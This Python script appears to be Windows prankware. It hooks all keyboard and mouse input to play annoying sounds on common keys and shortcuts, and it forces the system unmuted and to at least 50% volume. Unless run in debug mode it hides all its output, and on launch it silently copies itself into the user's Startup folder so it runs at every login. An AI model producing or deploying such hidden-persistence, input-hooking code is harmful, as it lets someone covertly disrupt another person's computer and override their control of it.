import os
import shutil
import sys
import threading
import time
import comtypes
import pygame
import xulbux as xx
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from pynput import keyboard, mouse
from pynput.keyboard import Key, KeyCode

MIN_VOLUME = 0.50  # Volume in percent.

SOUNDS = {
    "mouse": "assets/sound/mouse.wav",
    "\x03": "assets/sound/ctrl_c.wav",
    "\x13": "assets/sound/ctrl_s.wav",
    "\x16": "assets/sound/ctrl_v.wav",
    "alt_f4": "assets/sound/alt_f4.wav",
    "alt_s": "assets/sound/alt_s.wav",
    "alt_tab": "assets/sound/alt_tab.wav",
    "0": "assets/sound/zero.wav",
    "a": "assets/sound/a.wav",
    "j": "assets/sound/j.wav",
    "m": "assets/sound/m.wav",
    "w": "assets/sound/w.wav",
    "x": "assets/sound/x.wav",
    Key.backspace: "assets/sound/backspace.wav",
    Key.caps_lock: "assets/sound/caps_lock.wav",
    Key.cmd: "assets/sound/cmd.wav",
    Key.ctrl: "assets/sound/ctrl.wav",
    Key.delete: "assets/sound/delete.wav",
    Key.enter: "assets/sound/enter.wav",
    Key.esc: "assets/sound/escape.wav",
    Key.media_volume_down: "assets/sound/media_volume_down.wav",
    Key.print_screen: "assets/sound/print_screen.wav",
    Key.shift: "assets/sound/shift.wav",
    Key.space: "assets/sound/space.wav",
    Key.tab: "assets/sound/tab.wav",
}

DEBUG: bool = xx.console.get_args({"debug": ["-d", "--debug"]}).debug.exists

PYGAME_INITIALIZED = False
LOADED_SOUNDS = {}
PRESSED_KEYS: set[Key | KeyCode] = set()

if not DEBUG:
    sys.stdout = open(os.devnull, "w", encoding="utf-8")  # ruff:ignore[open-file-with-context-handler]
    sys.stderr = open(os.devnull, "w", encoding="utf-8")  # ruff:ignore[open-file-with-context-handler]


def add_self_to_startup() -> None:
    try:
        current_script_path = os.path.abspath(sys.argv[0])
        script_filename = os.path.basename(current_script_path)
        appdata_path = os.getenv("APPDATA")
        if not appdata_path:
            xx.console.fail("Could not retrieve APPDATA environment variable. Cannot manage startup.")
            return
        startup_dir = os.path.join(appdata_path, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target_script_path_in_startup = os.path.join(startup_dir, script_filename)
        if os.path.normcase(os.path.abspath(current_script_path)) == os.path.normcase(
            os.path.abspath(target_script_path_in_startup)
        ):
            xx.console.info("Script is running from startup directory. Won't copy itself to there.")
        else:
            xx.console.info(f"Copying script to startup directory: {target_script_path_in_startup}")
            try:
                os.makedirs(startup_dir, exist_ok=True)
                shutil.copy2(current_script_path, target_script_path_in_startup)
                xx.console.done("Script successfully copied to startup.")
            except Exception as exc:
                xx.console.fail(f"Failed to copy script to startup: {exc}")
    except Exception as exc:
        xx.console.fail(f"Error while trying to copy script to startup directory: {exc}")


def init_sounds() -> None:
    global LOADED_SOUNDS
    if not PYGAME_INITIALIZED:
        xx.console.warn("Pygame not initialized, skipping sound loading.")
        return
    try:
        resolved_sounds_paths = {}
        if hasattr(sys, "_MEIPASS"):
            base_path = getattr(sys, "_MEIPASS", os.path.abspath("."))
            xx.console.info(f"Using '_MEIPASS' as base path: {base_path}")
        else:
            base_path = xx.fs.get_script_dir()
            xx.console.info(f"'_MEIPASS' not found. Using script directory as base path: {base_path}")
        for name, relative_path in SOUNDS.items():
            absolute_path = os.path.normpath(os.path.join(base_path, relative_path))
            resolved_sounds_paths[name] = absolute_path
        temp_loaded_sounds = {}
        all_sounds_loaded_successfully = True
        for name, absolute_path in resolved_sounds_paths.items():
            if not os.path.exists(absolute_path):
                xx.console.warn(f"Sound file for '{name}' not found at: {absolute_path}")
                temp_loaded_sounds[name] = None
                all_sounds_loaded_successfully = False
                continue
            try:
                sound_object = pygame.mixer.Sound(absolute_path)
                temp_loaded_sounds[name] = sound_object
                xx.console.debug(f"Successfully loaded sound for '{name}' from {absolute_path}", active=DEBUG)
            except pygame.error as exc:
                xx.console.warn(f"Failed to load sound for '{name}' from {absolute_path} with pygame: {exc}")
                temp_loaded_sounds[name] = None
                all_sounds_loaded_successfully = False
        LOADED_SOUNDS.clear()
        LOADED_SOUNDS.update(temp_loaded_sounds)
        if not all_sounds_loaded_successfully:
            xx.console.warn(
                "One or more sound files could not be loaded by pygame or are missing.\n ⮡ Some sounds might not play."
            )
    except Exception as exc:
        xx.console.fail(f"Error while initializing the sound files with pygame: {exc}", exit_code=1)


def ensure_min_system_volume() -> None:  # ruff:ignore[complex-structure]
    """Ensure that the system volume is unmuted and set to at least the minimum threshold."""

    needs_uninitialize = False
    try:
        try:
            comtypes.CoInitialize()
            needs_uninitialize = True
        except comtypes.COMError as exc:
            if exc.hresult == 0x80010106:  # `RPC_E_CHANGED_MODE`
                xx.console.info(
                    "COM already initialized on this thread, possibly with a different mode (RPC_E_CHANGED_MODE).\n"
                    " ⮡ Proceeding with existing COM state for pycaw."
                )
                needs_uninitialize = False
            else:
                xx.console.fail(
                    "COM Initialization (CoInitialize) failed: "
                    f"HRESULT={exc.hresult}, Text='{exc.text}'.\n ⮡ Cannot manage volume.",
                    exit_code=1,
                )
        except Exception as exc_generic_init:
            xx.console.fail(
                f"Unexpected error during COM Initialization (CoInitialize): {exc_generic_init}.\n ⮡ Cannot manage volume.",
                exit_code=1,
            )
        speakers = AudioUtilities.GetSpeakers()
        if not speakers:
            xx.console.warn("No speaker device found.\n ⮡ Cannot manage master system volume.")
        else:
            volume_control = speakers.Activate(IAudioEndpointVolume._iid_, comtypes.CLSCTX_ALL, None).QueryInterface(
                IAudioEndpointVolume
            )
            current_mute_state = volume_control.GetMute()
            current_vol_scalar = volume_control.GetMasterVolumeLevelScalar()
            if current_mute_state:
                xx.console.info("System is muted. Ensuring it's unmuted and volume is adequate.")
                target_vol_scalar = max(current_vol_scalar, MIN_VOLUME)

                if target_vol_scalar != current_vol_scalar or current_vol_scalar < MIN_VOLUME:
                    xx.console.info(
                        f"Setting volume to {target_vol_scalar:.2f} (was {current_vol_scalar:.2f}, "
                        f"min required: {MIN_VOLUME:.2f}). This action is expected to unmute."
                    )
                else:
                    xx.console.info(
                        f"Volume is {current_vol_scalar:.2f}. [dim]/(already adequate)[_dim]"
                        "\n ⮡ Resetting volume to its current level to ensure unmute."
                    )
                volume_control.SetMasterVolumeLevelScalar(target_vol_scalar, None)
                if volume_control.GetMute():
                    volume_control.SetMute(False, None)
            elif current_vol_scalar < MIN_VOLUME:
                xx.console.info(
                    f"System not muted, but volume ({current_vol_scalar:.2f}) is below {MIN_VOLUME:.2f}. Adjusting."
                )
                volume_control.SetMasterVolumeLevelScalar(MIN_VOLUME, None)
    except comtypes.COMError as e_com_audio:
        xx.console.fail(
            f"pycaw/COM Error during audio device interaction: HRESULT={e_com_audio.hresult}, Text='{e_com_audio.text}'",
        )
        if e_com_audio.hresult == 0x8001010E:  # `RPC_E_WRONG_THREAD`
            xx.console.warn(
                "RPC_E_WRONG_THREAD: pycaw COM object accessed from wrong apartment.\n"
                "This is common if pynput threads are MTA and CoInitialize failed to set STA."
            )
    except Exception as exc_audio_generic:
        xx.console.fail(f"Unexpected error during pycaw audio device interaction: {exc_audio_generic}")
    finally:
        if needs_uninitialize:
            comtypes.CoUninitialize()


def _play_sound_task(sound_object: pygame.mixer.Sound) -> None:
    """Internal function to be run in a separate thread for sound playback using pygame."""

    ensure_min_system_volume()
    if sound_object:
        try:
            sound_object.play()
        except pygame.error as exc:
            xx.console.fail(f"Pygame error during sound playback: {exc}")
        except Exception as exc:
            xx.console.fail(f"Unexpected error during pygame sound playback: {exc}")
    else:
        xx.console.debug("Attempted to play a non-loaded sound object.", active=DEBUG)


def play_sound(sound_key) -> None:
    """Plays a sound associated with sound_key in a separate thread using pygame."""

    if not PYGAME_INITIALIZED:
        xx.console.debug("Pygame not initialized, skipping sound playback.", active=DEBUG)
        return
    sound_object = LOADED_SOUNDS.get(sound_key)
    if sound_object:
        sound_thread = threading.Thread(target=_play_sound_task, args=(sound_object,), daemon=True)
        sound_thread.start()
    elif sound_key in SOUNDS:
        xx.console.debug(f"Sound for key '{sound_key!s}' was defined but not loaded. Skipping playback.", active=DEBUG)


def on_click(x: int, y: int, button: object, pressed: bool) -> None:
    """Handle mouse click events to play click sound."""

    if pressed:
        xx.console.debug(f"Mouse clicked: {button} [dim]/(x: {x}, y: {y})[_dim]", active=DEBUG)
        play_sound("mouse")


def on_press(key) -> None:  # ruff:ignore[complex-structure]
    """Handle key press events to play annoying sounds."""

    try:
        xx.console.debug(f"Key pressed: {key} [dim]/(type: {type(key)})[_dim]", active=DEBUG)
        if PRESSED_KEYS & {Key.alt, Key.alt_l, Key.alt_r}:
            if key == Key.f4:
                play_sound("alt_f4")
                PRESSED_KEYS.add(key)
                return
            elif key == Key.tab:
                play_sound("alt_tab")
                PRESSED_KEYS.add(key)
                return
            elif isinstance(key, KeyCode) and key.char is not None:
                alt_char_key = f"alt_{key.char.lower()}"
                if alt_char_key in SOUNDS:
                    play_sound(alt_char_key)
                    PRESSED_KEYS.add(key)
                    return
        if PRESSED_KEYS & {Key.ctrl, Key.ctrl_l, Key.ctrl_r}:
            _ = isinstance(key, KeyCode) and key.char is not None

        PRESSED_KEYS.add(key)

        if key in SOUNDS:
            play_sound(key)
        elif key in {Key.shift_l, Key.shift_r}:
            play_sound(Key.shift)
        elif key in {Key.ctrl_l, Key.ctrl_r}:
            play_sound(Key.ctrl)
        elif key in {Key.cmd_l, Key.cmd_r}:
            play_sound(Key.cmd)
        elif isinstance(key, KeyCode) and key.char is not None:
            char_lower = key.char.lower()
            if char_lower in SOUNDS:
                play_sound(char_lower)
    except AttributeError:
        xx.console.debug(f"AttributeError for key: {key}", active=DEBUG)
    except Exception as exc:
        xx.console.fail(f"Error in 'on_press()': {exc}")


def on_release(key) -> None:
    """Handles key release events, primarily to manage key combinations."""

    try:
        if key in PRESSED_KEYS:
            PRESSED_KEYS.remove(key)
    except KeyError:
        pass
    except Exception as exc:
        xx.console.fail(f"Error in 'on_release()': {exc}")


def main() -> None:
    global PYGAME_INITIALIZED
    add_self_to_startup()

    try:
        pygame.init()
        pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=512)
        PYGAME_INITIALIZED = True
        xx.console.info("Pygame initialized successfully for audio playback.")
    except pygame.error as exc:
        xx.console.fail(f"Failed to initialize pygame or pygame.mixer: {exc}\n ⮡ Sound playback will be disabled.")
        PYGAME_INITIALIZED = False
    except Exception as exc_init:
        xx.console.fail(
            f"An unexpected error occurred during pygame initialization: {exc_init}\n ⮡ Sound playback will be disabled.",
        )
        PYGAME_INITIALIZED = False

    if PYGAME_INITIALIZED:
        init_sounds()
    else:
        xx.console.warn("Skipping sound initialization as pygame failed to initialize.")

    mouse_listener = mouse.Listener(on_click=on_click)
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    try:
        mouse_listener.start()
        keyboard_listener.start()
        xx.console.info("Global mouse and keyboard listeners started. Script running in background.")
    except Exception as exc:
        xx.console.fail(f"Error starting listeners: {exc}\n ⮡ Global sound triggers might not work.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        xx.console.exit("Script terminated by user. [dim]((Ctrl+C detected in console))")
    except Exception as exc:
        xx.console.fail(f"An unexpected error occurred in the main background loop: {exc}")
    finally:
        if PYGAME_INITIALIZED:
            pygame.quit()
            xx.console.info("Pygame resources released.")


if __name__ == "__main__":
    main()
